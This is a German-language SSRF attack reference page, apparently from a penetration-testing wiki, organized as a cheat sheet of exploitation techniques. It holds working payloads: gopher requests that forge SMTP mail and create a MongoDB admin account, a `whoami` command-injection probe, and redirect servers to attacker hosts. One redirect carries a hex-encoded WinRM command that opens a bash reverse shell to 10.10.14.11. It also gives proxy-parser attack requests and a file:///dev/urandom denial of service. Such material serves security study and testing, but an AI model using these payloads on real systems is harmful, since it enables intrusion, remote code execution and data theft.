# SSRF (Server Side Request Forgery)

{{#include ../../banners/hacktricks-training.md}}

## Grundlegende Informationen

Eine **Server-side Request Forgery (SSRF)**-Schwachstelle tritt auf, wenn ein Angreifer eine **serverseitige Anwendung** dazu bringt, **HTTP requests** an eine vom Angreifer gewählte Domain zu senden. Diese Schwachstelle setzt den Server willkürlichen externen Anfragen aus, die vom Angreifer gesteuert werden.

## SSRF erfassen

Das Erste, was Sie tun müssen, ist, eine von Ihnen verursachte SSRF-Interaktion zu erfassen. Um eine HTTP- oder DNS-Interaktion zu erfassen, können Sie Tools wie die folgenden verwenden:

- **Burp Collaborator**
- [**pingb**](http://pingb.in)
- [**canarytokens**](https://canarytokens.org/generate)
- [**interractsh**](https://github.com/projectdiscovery/interactsh)
- [**http://webhook.site**](http://webhook.site)
- [**https://github.com/teknogeek/ssrf-sheriff**](https://github.com/teknogeek/ssrf-sheriff)
- [http://requestrepo.com/](http://requestrepo.com/)
- [https://github.com/stolenusername/cowitness](https://github.com/stolenusername/cowitness)
- [https://github.com/dwisiswant0/ngocok](https://github.com/dwisiswant0/ngocok) - A Burp Collaborator using ngrok

## Whitelisted Domains Bypass

Normalerweise werden Sie feststellen, dass die SSRF nur in **bestimmten whitelisted Domains** oder URLs funktioniert. Auf der folgenden Seite finden Sie eine **Zusammenstellung von Techniken, um diese Whitelist zu umgehen**:


{{#ref}}
url-format-bypass.md
{{#endref}}

### Bypass via open redirect

Wenn der Server korrekt geschützt ist, könnten Sie **alle Einschränkungen umgehen, indem Sie ein Open Redirect innerhalb der Webseite ausnutzen**. Da die Webseite **SSRF zur gleichen Domain zulässt** und wahrscheinlich **Redirects folgt**, können Sie das **Open Redirect ausnutzen, damit der Server auf beliebige interne Ressourcen zugreift**.\
Read more here: [https://portswigger.net/web-security/ssrf](https://portswigger.net/web-security/ssrf)

## Protokolle

- **file://**
- Das URL-Schema `file://` wird erwähnt und zeigt direkt auf `/etc/passwd`: `file:///etc/passwd`
- **dict://**
- Das DICT-URL-Schema wird beschrieben und soll verwendet werden, um Definitionen oder Wortlisten über das DICT-Protokoll abzurufen. Ein gegebenes Beispiel zeigt eine konstruierte URL, die auf ein bestimmtes Wort, eine Datenbank und eine Eintragsnummer abzielt, sowie einen Fall, in dem ein PHP-Skript möglicherweise missbraucht wird, um sich mit einem DICT-Server unter Verwendung vom Angreifer bereitgestellter Anmeldedaten zu verbinden: `dict://<generic_user>;<auth>@<generic_host>:<port>/d:<word>:<database>:<n>`
- **SFTP://**
- Als Protokoll für sicheren Dateitransfer über Secure Shell identifiziert; ein Beispiel zeigt, wie ein PHP-Skript ausgenutzt werden könnte, um eine Verbindung zu einem bösartigen SFTP-Server herzustellen: `url=sftp://generic.com:11111/`
- **TFTP://**
- Trivial File Transfer Protocol, das über UDP arbeitet, wird erwähnt; ein Beispiel zeigt ein PHP-Skript, das eine Anfrage an einen TFTP-Server sendet. Eine TFTP-Anfrage wird an 'generic.com' auf Port '12346' für die Datei 'TESTUDPPACKET' gesendet: `ssrf.php?url=tftp://generic.com:12346/TESTUDPPACKET`
- **LDAP://**
- Dieser Abschnitt behandelt das Lightweight Directory Access Protocol und betont seine Verwendung zur Verwaltung und zum Zugriff auf verteilte Verzeichnisdienste über IP-Netzwerke. Interagieren mit einem LDAP-Server auf localhost: `'%0astats%0aquit' via ssrf.php?url=ldap://localhost:11211/%0astats%0aquit.`
- **SMTP**
- Es wird eine Methode beschrieben, wie SSRF-Schwachstellen ausgenutzt werden können, um mit SMTP-Diensten auf localhost zu interagieren, einschließlich Schritten zur Offenlegung interner Domain-Namen und weiteren Ermittlungsmaßnahmen basierend auf diesen Informationen.
```
From https://twitter.com/har1sec/status/1182255952055164929
1. connect with SSRF on smtp localhost:25
2. from the first line get the internal domain name 220[ http://blabla.internaldomain.com ](https://t.co/Ad49NBb7xy)ESMTP Sendmail
3. search[ http://internaldomain.com ](https://t.co/K0mHR0SPVH)on github, find subdomains
4. connect
```
- **Curl URL globbing - WAF bypass**
- Wenn SSRF mit **curl** ausgeführt wird, hat curl eine Funktion namens [**URL globbing**](https://everything.curl.dev/cmdline/globbing), die nützlich sein könnte, um WAFs zu umgehen. Zum Beispiel findest du in diesem [**writeup**](https://blog.arkark.dev/2022/11/18/seccon-en/#web-easylfi) dieses Beispiel für eine **path traversal via `file` protocol**:
```
file:///app/public/{.}./{.}./{app/public/hello.html,flag.txt}
```
- **Gopher://**
- Die Fähigkeit des Gopher-Protokolls, IP, Port und Bytes für die Serverkommunikation anzugeben, wird erläutert, ebenso Tools wie [Gopherus](https://github.com/tarunkant/Gopherus) und [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser) zum Erstellen von Payloads. Zwei verschiedene Verwendungen werden veranschaulicht:

### Gopher://

Using this protocol you can specify the **IP, port and bytes** you want the server to **send**. Then, you can basically exploit a SSRF to **communicate with any TCP server** (but you need to know how to talk to the service first).\
Fortunately, you can use [Gopherus](https://github.com/tarunkant/Gopherus) to create payloads for several services. Additionally, [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser) can be used to create _gopher_ payloads for _Java RMI_ services.

**Gopher smtp**
```
ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a
will make a request like
HELO localhost
MAIL FROM:<hacker@site.com>
RCPT TO:<victim@site.com>
DATA
From: [Hacker] <hacker@site.com>
To: <victime@site.com>
Date: Tue, 15 Sep 2017 17:20:26 -0400
Subject: Ah Ah AHYou didn't say the magic word !
.
QUIT
```
**Gopher HTTP**
```bash
#For new lines you can use %0A, %0D%0A
gopher://<server>:8080/_GET / HTTP/1.0%0A%0A
gopher://<server>:8080/_POST%20/x%20HTTP/1.0%0ACookie: eatme%0A%0AI+am+a+post+body
```
**Gopher SMTP — Back connect to 1337**
```php:redirect.php
<?php
header("Location: gopher://hack3r.site:1337/_SSRF%0ATest!");
?>Now query it.
https://example.com/?q=http://evil.com/redirect.php.
```
#### Gopher MongoDB -- Benutzer erstellen mit username=admin, password=admin123 und permission=administrator
```bash
# Check: https://brycec.me/posts/dicectf_2023_challenges#unfinished
curl 'gopher://0.0.0.0:27017/_%a0%00%00%00%00%00%00%00%00%00%00%00%dd%0
7%00%00%00%00%00%00%00%8b%00%00%00%02insert%00%06%00%00%00users%00%02$db%00%0a
%00%00%00percetron%00%04documents%00V%00%00%00%030%00N%00%00%00%02username%00%
06%00%00%00admin%00%02password%00%09%00%00%00admin123%00%02permission%00%0e%00
%00%00administrator%00%00%00%00'
```
## SSRF via Referrer header & Others

Analytics-Software auf Servern protokolliert häufig den Referrer header, um eingehende Links zu verfolgen — eine Praxis, die Anwendungen unbeabsichtigt für Server-Side Request Forgery (SSRF) vulnerabilities öffnet. Das liegt daran, dass solche Software externe URLs, die im Referrer header genannt werden, besuchen kann, um den Inhalt der verweisenden Seite zu analysieren. Um diese vulnerabilities aufzudecken, empfiehlt sich das Burp Suite-Plugin "**Collaborator Everywhere**", das ausnutzt, wie Analytics-Tools den Referer header verarbeiten, um potenzielle SSRF-Angriffsflächen zu identifizieren.

## SSRF via SNI data from certificate

Eine Fehlkonfiguration, die die Verbindung zu beliebigen Backends durch eine einfache Einrichtung ermöglichen könnte, wird mit einer Beispiel Nginx configuration veranschaulicht:
```
stream {
server {
listen 443;
resolver 127.0.0.11;
proxy_pass $ssl_preread_server_name:443;
ssl_preread on;
}
}
```
In dieser Konfiguration wird der Wert aus dem Server Name Indication (SNI)-Feld direkt als Adresse des Backends verwendet. Diese Einstellung macht das System anfällig für Server-Side Request Forgery (SSRF), die ausgenutzt werden kann, indem man einfach die gewünschte IP-Adresse oder den Domainnamen im SNI-Feld angibt. Ein Beispiel für die Ausnutzung, um eine Verbindung zu einem beliebigen Backend wie `internal.host.com` mit dem `openssl`-Befehl zu erzwingen, ist unten dargestellt:
```bash
openssl s_client -connect target.com:443 -servername "internal.host.com" -crlf
```
## SSRF via TLS AIA CA Issuers (Java mTLS)

Einige TLS-Stacks laden fehlende Zwischen-CAs automatisch herunter, indem sie die **Authority Information Access (AIA) → CA Issuers** URI im Peer-Zertifikat verwenden. In **Java** führt das Aktivieren von `-Dcom.sun.security.enableAIAcaIssuers=true` beim Betreiben eines mTLS-Services dazu, dass der Server angreifer-kontrollierte URIs aus dem Client-Zertifikat **während des Handshakes** aufruft, noch bevor irgendwelche HTTP-Logiken ausgeführt werden.

- **Anforderungen**: mTLS aktiviert, Java AIA fetching aktiviert, der Angreifer kann ein Client-Zertifikat mit einer manipulierten AIA CA Issuers URI vorlegen.
- **Auslösen von SSRF** (Java 21 Beispiel):
```bash
java -Djava.security.debug=certpath \
-Dcom.sun.security.enableAIAcaIssuers=true \
-Dhttp.agent="AIA CA Issuers PoC" -jar server.jar
# Attacker cert AIA: http://localhost:8080
nc -l 8080 -k                      # observe the outbound fetch
curl https://mtls-server:8444 --key client-aia-key.pem --cert client-aia-localhost-cert.pem --cacert ca-cert.pem
```
Die Java certpath-Debug-Ausgabe zeigt `CertStore URI:http://localhost:8080`, und `nc` erfasst die HTTP-Anfrage mit dem steuerbaren `User-Agent` von `-Dhttp.agent`, was SSRF während der Zertifikatsvalidierung beweist.
- **DoS via file://**: Das Setzen der AIA CA Issuers auf `file:///dev/urandom` auf Unix-ähnlichen Hosts veranlasst Java, dies als CertStore zu behandeln und unbegrenzt zufällige Bytes zu lesen, wodurch ein CPU-Kern beschäftigt bleibt und nachfolgende Verbindungen blockiert werden, selbst nachdem der Client die Verbindung getrennt hat.

## [Wget file upload](../file-upload/index.html#wget-file-upload-ssrf-trick)

## SSRF with Command Injection

Es kann sich lohnen, eine Nutzlast wie: `` url=http://3iufty2q67fuy2dew3yug4f34.burpcollaborator.net?`whoami` `` zu versuchen

## PDF-Erstellung

Wenn die Webseite automatisch ein PDF mit einigen Informationen erstellt, die Sie bereitgestellt haben, können Sie **JS einfügen, das vom PDF-Ersteller** selbst (dem Server) beim Erstellen des PDFs ausgeführt wird, und so SSRF ausnutzen. [**Find more information here**](../xss-cross-site-scripting/server-side-xss-dynamic-pdf.md)**.**

## Vom SSRF zu DoS

Erstellen Sie mehrere Sessions und versuchen Sie, große Dateien herunterzuladen, indem Sie SSRF aus den Sessions ausnutzen.

## SSRF PHP-Funktionen

Überprüfen Sie die folgende Seite auf verwundbare PHP- und sogar Wordpress-Funktionen:


{{#ref}}
../../network-services-pentesting/pentesting-web/php-tricks-esp/php-ssrf.md
{{#endref}}

## SSRF Redirect to Gopher

Für einige Exploits müssen Sie möglicherweise eine **Redirect-Antwort senden** (um eventuell ein anderes Protokoll wie gopher zu verwenden). Hier finden Sie verschiedene python-Codes, um mit einem Redirect zu antworten:
```python
# First run: openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

class MainHandler(BaseHTTPRequestHandler):
def do_GET(self):
print("GET")
self.send_response(301)
self.send_header("Location", "gopher://127.0.0.1:5985/_%50%4f%53%54%20%2f%77%73%6d%61%6e%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%31%30%2e%31%30%2e%31%31%2e%31%31%37%3a%35%39%38%36%0d%0a%55%73%65%72%2d%41%67%65%6e%74%3a%20%70%79%74%68%6f%6e%2d%72%65%71%75%65%73%74%73%2f%32%2e%32%35%2e%31%0d%0a%41%63%63%65%70%74%2d%45%6e%63%6f%64%69%6e%67%3a%20%67%7a%69%70%2c%20%64%65%66%6c%61%74%65%0d%0a%41%63%63%65%70%74%3a%20%2a%2f%2a%0d%0a%43%6f%6e%6e%65%63%74%69%6f%6e%3a%20%63%6c%6f%73%65%0d%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%73%6f%61%70%2b%78%6d%6c%3b%63%68%61%72%73%65%74%3d%55%54%46%2d%38%0d%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%31%37%32%38%0d%0a%0d%0a%3c%73%3a%45%6e%76%65%6c%6f%70%65%20%78%6d%6c%6e%73%3a%73%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%33%2f%30%35%2f%73%6f%61%70%2d%65%6e%76%65%6c%6f%70%65%22%20%78%6d%6c%6e%73%3a%61%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%38%2f%61%64%64%72%65%73%73%69%6e%67%22%20%78%6d%6c%6e%73%3a%68%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%6d%69%63%72%6f%73%6f%66%74%2e%63%6f%6d%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%69%6e%64%6f%77%73%2f%73%68%65%6c%6c%22%20%78%6d%6c%6e%73%3a%6e%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%39%2f%65%6e%75%6d%65%72%61%74%69%6f%6e%22%20%78%6d%6c%6e%73%3a%70%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%6d%69%63%72%6f%73%6f%66%74%2e%63%6f%6d%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%73%6d%61%6e%2e%78%73%64%22%20%78%6d%6c%6e%73%3a%77%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%73%6d%61%6e%2e%78%73%64%22%20%78%6d%6c%6e%73%3a%78%73%69%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%31%2f%58%4d%4c%53%63%68%65%6d%61%22%3e%0a%20%20%20%3c%73%3a%48%65%61%64%65%72%3e%0a%20%20%20%20%20%20%3c%61%3a%54%6f%3e%48%54%54%50%3a%2f%2f%31%39%32%2e%31%36%38%2e%31%2e%31%3a%35%39%38%36%2f%77%73%6d%61%6e%2f%3c%2f%61%3a%54%6f%3e%0a%20%20%20%20%20%20%3c%77%3a%52%65%73%6f%75%72%63%65%55%52%49%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%3c%2f%77%3a%52%65%73%6f%75%72%63%65%55%52%49%3e%0a%20%20%20%20%20%20%3c%61%3a%52%65%70%6c%79%54%6f%3e%0a%20%20%20%20%20%20%20%20%20%3c%61%3a%41%64%64%72%65%73%73%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%38%2f%61%64%64%72%65%73%73%69%6e%67%2f%72%6f%6c%65%2f%61%6e%6f%6e%79%6d%6f%75%73%3c%2f%61%3a%41%64%64%72%65%73%73%3e%0a%20%20%20%20%20%20%3c%2f%61%3a%52%65%70%6c%79%54%6f%3e%0a%20%20%20%20%20%20%3c%61%3a%41%63%74%69%6f%6e%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%2f%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%3c%2f%61%3a%41%63%74%69%6f%6e%3e%0a%20%20%20%20%20%20%3c%77%3a%4d%61%78%45%6e%76%65%6c%6f%70%65%53%69%7a%65%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%31%30%32%34%30%30%3c%2f%77%3a%4d%61%78%45%6e%76%65%6c%6f%70%65%53%69%7a%65%3e%0a%20%20%20%20%20%20%3c%61%3a%4d%65%73%73%61%67%65%49%44%3e%75%75%69%64%3a%30%41%42%35%38%30%38%37%2d%43%32%43%33%2d%30%30%30%35%2d%30%30%30%30%2d%30%30%30%30%30%30%30%31%30%30%30%30%3c%2f%61%3a%4d%65%73%73%61%67%65%49%44%3e%0a%20%20%20%20%20%20%3c%77%3a%4f%70%65%72%61%74%69%6f%6e%54%69%6d%65%6f%75%74%3e%50%54%31%4d%33%30%53%3c%2f%77%3a%4f%70%65%72%61%74%69%6f%6e%54%69%6d%65%6f%75%74%3e%0a%20%20%20%20%20%20%3c%77%3a%4c%6f%63%61%6c%65%20%78%6d%6c%3a%6c%61%6e%67%3d%22%65%6e%2d%75%73%22%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%66%61%6c%73%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%70%3a%44%61%74%61%4c%6f%63%61%6c%65%20%78%6d%6c%3a%6c%61%6e%67%3d%22%65%6e%2d%75%73%22%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%66%61%6c%73%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%77%3a%4f%70%74%69%6f%6e%53%65%74%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%77%3a%53%65%6c%65%63%74%6f%72%53%65%74%3e%0a%20%20%20%20%20%20%20%20%20%3c%77%3a%53%65%6c%65%63%74%6f%72%20%4e%61%6d%65%3d%22%5f%5f%63%69%6d%6e%61%6d%65%73%70%61%63%65%22%3e%72%6f%6f%74%2f%73%63%78%3c%2f%77%3a%53%65%6c%65%63%74%6f%72%3e%0a%20%20%20%20%20%20%3c%2f%77%3a%53%65%6c%65%63%74%6f%72%53%65%74%3e%0a%20%20%20%3c%2f%73%3a%48%65%61%64%65%72%3e%0a%20%20%20%3c%73%3a%42%6f%64%79%3e%0a%20%20%20%20%20%20%3c%70%3a%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%5f%49%4e%50%55%54%20%78%6d%6c%6e%73%3a%70%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%22%3e%0a%20%20%20%20%20%20%20%20%20%3c%70%3a%63%6f%6d%6d%61%6e%64%3e%65%63%68%6f%20%2d%6e%20%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%43%34%78%4d%43%34%78%4e%43%34%78%4d%53%38%35%4d%44%41%78%49%44%41%2b%4a%6a%45%3d%20%7c%20%62%61%73%65%36%34%20%2d%64%20%7c%20%62%61%73%68%3c%2f%70%3a%63%6f%6d%6d%61%6e%64%3e%0a%20%20%20%20%20%20%20%20%20%3c%70%3a%74%69%6d%65%6f%75%74%3e%30%3c%2f%70%3a%74%69%6d%65%6f%75%74%3e%0a%20%20%20%20%20%20%3c%2f%70%3a%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%5f%49%4e%50%55%54%3e%0a%20%20%20%3c%2f%73%3a%42%6f%64%79%3e%0a%3c%2f%73%3a%45%6e%76%65%6c%6f%70%65%3e%0a")
self.end_headers()

httpd = HTTPServer(('0.0.0.0', 443), MainHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="server.pem", server_side=True)
httpd.serve_forever()
```

```python
from flask import Flask, redirect
from urllib.parse import quote
app = Flask(__name__)

@app.route('/')
def root():
return redirect('gopher://127.0.0.1:5985/_%50%4f%53%54%20%2f%77%73%6d%61%6e%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20', code=301)

if __name__ == "__main__":
app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
```
## Fehlkonfigurierte Proxies für SSRF

Tricks [**aus diesem Beitrag**](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies).

### Flask

<details>

<summary>Flask-Proxy: verwundbarer Code</summary>
```python
from flask import Flask
from requests import get

app = Flask('__main__')
SITE_NAME = 'https://google.com'

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')

def proxy(path):
return get(f'{SITE_NAME}{path}').content

if __name__ == "__main__":
app.run(threaded=False)
```
</details>

Flask erlaubt die Verwendung von **`@`** als Anfangszeichen, wodurch der **anfängliche Hostname zum Benutzernamen** wird und ein neuer eingeschleust werden kann. Attack request:
```http
GET @evildomain.com/ HTTP/1.1
Host: target.com
Connection: close
```
### Spring Boot <a href="#heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation" id="heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation"></a>

Verwundbarer Code:

<figure><img src="../../images/image (1201).png" alt=""><figcaption></figcaption></figure>

Es wurde entdeckt, dass es möglich ist, den Pfad einer Anfrage mit dem Zeichen **`;`** zu beginnen, wodurch anschließend **`@`** verwendet werden kann, um einen neuen Host zum Zugriff zu injizieren. Angriffsanfrage:
```http
GET ;@evil.com/url HTTP/1.1
Host: target.com
Connection: close
```
### PHP eingebauter Webserver <a href="#heading-php-built-in-web-server-case-study-ssrf-through-incorrect-pathname-interpretation" id="heading-php-built-in-web-server-case-study-ssrf-through-incorrect-pathname-interpretation"></a>

<details>

<summary>Verwundbarer PHP-Code</summary>
```php
<?php
$site = "http://ifconfig.me";
$current_uri = $_SERVER['REQUEST_URI'];

$proxy_site = $site.$current_uri;
var_dump($proxy_site);

echo "\n\n";

$response = file_get_contents($proxy_site);
var_dump($response);
?>
```
</details>

PHP erlaubt die Verwendung des Zeichens `*` vor einem Slash im Pfad einer URL, hat jedoch weitere Einschränkungen: Es kann nur für den Root-Pfadnamen `/` verwendet werden und Punkte `.` sind vor dem ersten Slash nicht erlaubt. Daher muss beispielsweise eine punktlose hex-kodierte IP-Adresse verwendet werden:
```http
GET *@0xa9fea9fe/ HTTP/1.1
Host: target.com
Connection: close
```
## DNS Rebidding CORS/SOP bypass

Wenn du **Probleme** hast, **Inhalte von einer lokalen IP zu exfiltrate**, weil **CORS/SOP**, kann **DNS Rebidding** verwendet werden, um diese Einschränkung zu bypassen:


{{#ref}}
../cors-bypass.md
{{#endref}}

### Automated DNS Rebidding

[**`Singularity of Origin`**](https://github.com/nccgroup/singularity) ist ein Tool, um [DNS rebinding](https://en.wikipedia.org/wiki/DNS_rebinding)-Angriffe durchzuführen. Es enthält die notwendigen Komponenten, um die IP-Adresse des DNS-Namens des Angreifer-Servers an die IP-Adresse der Zielmaschine zu rebinden und Angriffs-payloads bereitzustellen, um verwundbare Software auf der Zielmaschine auszunutzen.

Sieh dir auch den **öffentlich laufenden Server an unter** [**http://rebind.it/singularity.html**](http://rebind.it/singularity.html)

## DNS Rebidding + TLS Session ID/Session ticket

Voraussetzungen:

- **SSRF**
- **Outbound TLS sessions**
- **Stuff on local ports**

Angriff:

1. Bring den Benutzer/Bot dazu, eine vom **Angreifer** kontrollierte **domain** aufzurufen.
2. Der **TTL** des **DNS** ist **0** s (damit das Opfer die IP der domain bald erneut abfragt).
3. Eine **TLS connection** wird zwischen dem Opfer und der domain des Angreifers aufgebaut. Der Angreifer platziert die **payload** innerhalb der **Session ID** oder des **Session Ticket**.
4. Die **domain** startet eine **infinite loop** von **redirects** gegen sich selbst. Ziel ist, den Benutzer/Bot so lange die domain aufrufen zu lassen, bis er erneut eine **DNS request** für die domain stellt.
5. In der DNS-Anfrage wird nun eine **private IP** zurückgegeben (z. B. 127.0.0.1).
6. Der Benutzer/Bot versucht, die **TLS connection** wiederherzustellen und sendet dafür die **Session ID**/**Ticket ID** (in der die **payload** des Angreifers enthalten war). Herzlichen Glückwunsch — du hast es geschafft, den **Benutzer/Bot dazu zu bringen, sich selbst anzugreifen**.

Beachte, dass du für einen Angriff auf localhost:11211 (_memcache_) das Opfer die Initialverbindung zu www.attacker.com:11211 herstellen lassen musst (der **Port muss immer derselbe sein**).\
Um diesen Angriff durchzuführen kannst du das Tool verwenden: [https://github.com/jmdx/TLS-poison/](https://github.com/jmdx/TLS-poison/)\
Für **mehr Informationen** sieh dir den Talk an, in dem dieser Angriff erklärt wird: [https://www.youtube.com/watch?v=qGpAJxfADjo\&ab_channel=DEFCONConference](https://www.youtube.com/watch?v=qGpAJxfADjo&ab_channel=DEFCONConference)

## Blind SSRF

Der Unterschied zwischen einem blinden SSRF und einem nicht-blinden besteht darin, dass du beim blinden die Antwort der SSRF-Anfrage nicht sehen kannst. Dadurch ist es schwieriger, die Schwachstelle auszunutzen, weil du nur gut bekannte Vulnerabilities ausnutzen kannst.

### Time based SSRF

**Indem man die Zeit prüft** der Antworten vom Server, kann es **möglich sein festzustellen, ob eine Ressource existiert oder nicht** (vielleicht dauert der Zugriff auf eine existierende Ressource länger als auf eine, die nicht existiert)

### Vom blinden zum vollständigen Missbrauch von Statuscodes

Laut diesem [**blog post**](https://slcyber.io/assetnote-security-research-center/novel-ssrf-technique-involving-http-redirect-loops/), können einige blind SSRF dadurch entstehen, dass selbst wenn die Ziel-URL mit einem 200-Statuscode antwortet (wie etwa AWS metadata), diese Daten nicht korrekt formatiert sind und die App sie daher möglicherweise ablehnt anzuzeigen.

Es wurde jedoch festgestellt, dass das Senden von Redirect-Antworten mit Statuscodes 305 bis 309 im SSRF es möglich machen kann, dass die Anwendung diesen Redirects folgt und dabei in einen Fehler-Modus wechselt, der die Formatprüfung der Daten nicht mehr durchführt und sie einfach ausgibt.

Der Python-Server, der verwendet wurde, um dies auszunutzen, ist folgender:
```python
@app.route("/redir")
def redir():
count = int(request.args.get("count", 0)) + 1
# Pump out 305, 306, 307, 308, 309, 310 ...
weird_status = 301 + count
if count >= 10:                      # after 5 “weird” codes
return redirect(METADATA_URL, 302)
return redirect(f"/redir?count={count}", weird_status)

@app.route("/start")
def start():
return redirect("/redir", 302)
```
**Schritte:**
- Zuerst bringt 302 die App dazu, Redirects zu folgen.
- Dann empfängt sie 305 → 306 → 307 → 308 → 309 → 310.
- Nach dem 5. merkwürdigen Code gibt der PoC schließlich 302 → 169.254.169.254 → 200 OK zurück.

**Was im Ziel passiert:**
- libcurl selbst folgt 305–310; es normalisiert unbekannte Codes einfach zu “follow.”
- Nach N seltsamen Redirects (≥ 5 hier) entscheidet der eigene Wrapper der Anwendung, dass “etwas nicht stimmt” und wechselt in einen für Debugging gedachten Fehler-Modus.
- In diesem Modus gibt es die gesamte Redirect-Kette plus den finalen Body an den externen Aufrufer zurück.
- Ergebnis: attacker sieht jeden Header + die metadata JSON — Aufgabe erfüllt.

Beachte, dass das interessant ist, um Statuscodes zu leak, die du vorher nicht hättest leak können (wie ein 200). Wenn du jedoch irgendwie auch den Statuscode der Antwort auswählen könntest (stell dir vor, du könntest bestimmen, dass die AWS metadata mit einem 500 Statuscode antwortet), **könnte es Statuscodes geben, die den Inhalt der Antwort direkt leak.**

### HTML-to-PDF-Renderer als blinde SSRF-Gadgets

Bibliotheken wie **TCPDF** (und Wrapper wie **spipu/html2pdf**) holen automatisch alle URLs, die in attacker-controlled HTML vorhanden sind, während sie ein PDF rendern. Jedes `<img>` oder `<link rel="stylesheet">`-Attribut wird serverseitig via cURL, `getimagesize()`, oder `file_get_contents()` aufgelöst, sodass du den PDF-Worker dazu bringen kannst, interne Hosts abzufragen, obwohl dir keine HTTP-Antwort reflektiert wird.
```
<html>
<body>
<img width="1" height="1" src="http://127.0.0.1:8080/healthz">
<link rel="stylesheet" type="text/css" href="http://10.0.0.5/admin" />
</body>
</html>
```
- TCPDF 6.10.0 führt für jede `<img>`-Ressource mehrere Abrufversuche durch, sodass eine einzelne payload mehrere requests auslösen kann (hilfreich für timing-basierte Port-Scans).
- html2pdf übernimmt das Verhalten von TCPDF für `<img>` und fügt das Abrufen von CSS innerhalb von `Css::extractStyle()` hinzu, das nach einer oberflächlichen Scheme-Prüfung einfach `file_get_contents($href)` aufruft. Missbrauche es, um Loopback-Services, RFC1918-Bereiche oder cloud metadata endpoints anzusprechen.
- Kombiniere dieses SSRF-Primitive mit den [HTML-to-PDF path traversal tricks](../file-inclusion/README.md#html-to-pdf-svgimg-path-traversal), um sowohl interne HTTP-Antworten als auch lokale Dateien, die in das PDF gerendert werden, zu leak.

Sicherheitsverantwortliche sollten externe URLs vor dem Rendern entfernen oder den Renderer in einer Netzwerk-Sandbox isolieren; bis dahin sollten PDF-Generatoren als blind SSRF proxies behandelt werden.

## Cloud SSRF-Ausnutzung

